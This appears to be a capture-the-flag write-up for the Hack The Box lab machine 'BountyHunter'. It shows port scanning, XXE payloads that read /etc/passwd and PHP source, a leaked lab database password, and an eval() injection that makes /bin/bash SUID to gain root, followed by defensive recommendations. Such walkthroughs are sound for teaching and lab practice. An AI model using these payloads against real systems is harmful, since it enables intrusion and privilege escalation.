# HTB - BountyHunter

**IP Address:** `10.10.11.100`  
**OS:** Ubuntu (Focal)  
**Difficulty:** Easy  
**Tags:** #XXE, #BurpSuite, #WFuzz, #PythonEval, #PrivilegeEscalation

---
## Synopsis

BountyHunter is an easy Linux machine that involves exploiting an **XML External Entity (XXE)** vulnerability to extract sensitive files, brute-forcing hidden directories, and retrieving database credentials.  
A misconfigured Python script with insecure use of `eval()` is later abused for privilege escalation to root.

---
## Skills Required

- Basic web enumeration  
- Familiarity with BurpSuite and intercepting requests  
- Understanding of XML/XXE attacks  
- Python scripting logic analysis  

## Skills Learned

- Exploiting **XXE injection** to read local files  
- Extracting credentials from PHP source code via filters  
- Brute-forcing directories with **WFuzz**  
- Abusing insecure `eval()` usage for privilege escalation  

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Check if the host is alive using ICMP:

```bash
ping -c 1 10.10.11.100
```

![[GitHub Documentation/EASY/HTB_BountyHunter_Writeup/screenshots1/ping.png]]

The host responds, confirming it is reachable.

---
### 1.2 Port Scanning

Perform a full TCP scan to identify open services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.100 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![[GitHub Documentation/EASY/HTB_BountyHunter_Writeup/screenshots1/allports.png]]

Extract the results:

```bash
extractPorts allPorts
```

![[GitHub Documentation/EASY/HTB_BountyHunter_Writeup/screenshots1/extractports.png]]

---
### 1.3 Targeted Scan

Run a more detailed scan on the identified open ports:

```bash
nmap -sCV -p22,80 10.10.11.100 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

```bash
cat targeted -l java
```

![[GitHub Documentation/EASY/HTB_BountyHunter_Writeup/screenshots1/targeted.png]]

**Findings:**

| Port | Service | Description            |
| ---- | ------- | ---------------------- |
| 22   | SSH     | OpenSSH (Ubuntu Focal) |
| 80   | HTTP    | Apache web server      |

We confirm the target is running **Ubuntu Focal**. This may be useful later when searching for specific exploits.

---
## 2. Web Enumeration

We use **whatweb** to identify technologies behind the web service:

```bash
whatweb http://10.10.11.100
```

![[GitHub Documentation/EASY/HTB_BountyHunter_Writeup/screenshots1/whatweb.png]]

Accessing the website:

![[web_main.png]]
![[GitHub Documentation/EASY/HTB_BountyHunter_Writeup/screenshots1/web_contact.png]]

The main page is static, with non-functional buttons like "Download" and *send* button from "Contact Us" is not working.

Navigating to **Portal** in the top right:

![[web_portal.png]]

We find an input form:

![[web_log_submit.png]]

This suggests potential for **file upload/LFI/XXE** vulnerabilities.

Filling the form:

![[web_log_submit_test.png]]

The response reflects our input, so we test with `{{7*7}}` for SSTI:

![[web_log_submit_7.png]]

No result. Let’s intercept with **BurpSuite**.

![[bs_test.png]]

Captured request shows data encoded in **Base64 XML**.

Decoded:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<bugreport>
<title>test</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>test</reward>
</bugreport>
```

This indicates possible **XXE injection**.

---
## 3. Exploitation

### 3.1 XXE Injection

We craft a payload to read `/etc/passwd`:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>&xxe;</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>test</reward>
</bugreport>
```

Encode to Base64 and send via Burp Repeater:

![[bs_xxe_sended.png]]

Result shows `/etc/passwd`, confirming **XXE exploitation**.  
We discover users `root` and `development`.

Next, attempt `/home/development/.ssh/id_rsa`:

![[bs_id_rsa_sended.png]]

Failed. We pivot to reading PHP source code.

### 3.2 Reading PHP Source

Using **php://filter** we dump `log_submit.php`:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=log_submit.php"> ]>
```

![[bs_log_submit_sended.png]]

Decoded PHP reveals simple input handling, no sensitive data.

We brute-force directories with **WFuzz**:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ.php
```

![[wfuzz.png]]

Findings: **index.php** and **db.php**

Dumping `db.php` with XXE:

![[bs_db_sended.png]]

Decoded credentials:

![[bs_credentials.png]]

```php
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
```

---
## 4. Foothold

We attempt SSH access with the discovered credentials:

```bash
ssh development@10.10.11.100
```

![[GitHub Documentation/EASY/HTB_BountyHunter_Writeup/screenshots1/user_flag.png]]

✅ **User flag obtained**

Inside `/home/development`, we also find `contract.txt`:

![[user_contract.png]]

It references special permissions to run a script.

---
## 5. Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

![[GitHub Documentation/EASY/HTB_BountyHunter_Writeup/screenshots1/user_priv.png]]

We can run `/opt/skytrain_inc/ticketValidator.py` as root.

Listing ownership:

```bash
ls -l /opt/skytrain_inc/ticketValidator.py
```

![[bash_priv.png]]

The script is root-owned, so cannot be modified. Let’s review it:

```bash
cat /opt/skytrain_inc/ticketValidator.py | less
```

![[cat_ticketvalidator.png]]

It evaluates Markdown files, using dangerous `eval()`:

```python
if int(ticketCode) % 7 == 4:
    validationNumber = eval(x.replace("**", ""))
    if validationNumber > 100:
        return True
```

We can exploit this by creating a malicious Markdown:

```markdown
# Skytrain Inc
## Ticket to 
__Ticket Code:__
** 11 + 2 and __import__('os').system('chmod u+s /bin/bash')
```

Upload the file and execute:

```bash
sudo -u root python3.8 /opt/skytrain_inc/ticketValidator.py
```

Now `/bin/bash` is SUID root. Spawn root shell:

```bash
bash -p
```

![[GitHub Documentation/EASY/HTB_BountyHunter_Writeup/screenshots1/root_flag.png]]

✅ **Root flag obtained**

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Port Scanning** → Identified SSH and HTTP.  
2. **XXE Injection** → Extracted `/etc/passwd`.  
3. **PHP Source Disclosure** → Found database credentials.  
4. **SSH Foothold** → Logged in as `development`.  
5. **Privilege Escalation** → Exploited insecure `eval()` in Python script to escalate privileges.  

---
## Defensive Recommendations

- Disable XML External Entities (XXE) in all XML parsers.  
- Never store credentials in source code; use environment variables or secret managers.  
- Apply least privilege to users and scripts.  
- Avoid using `eval()` in production code; sanitize input properly.  
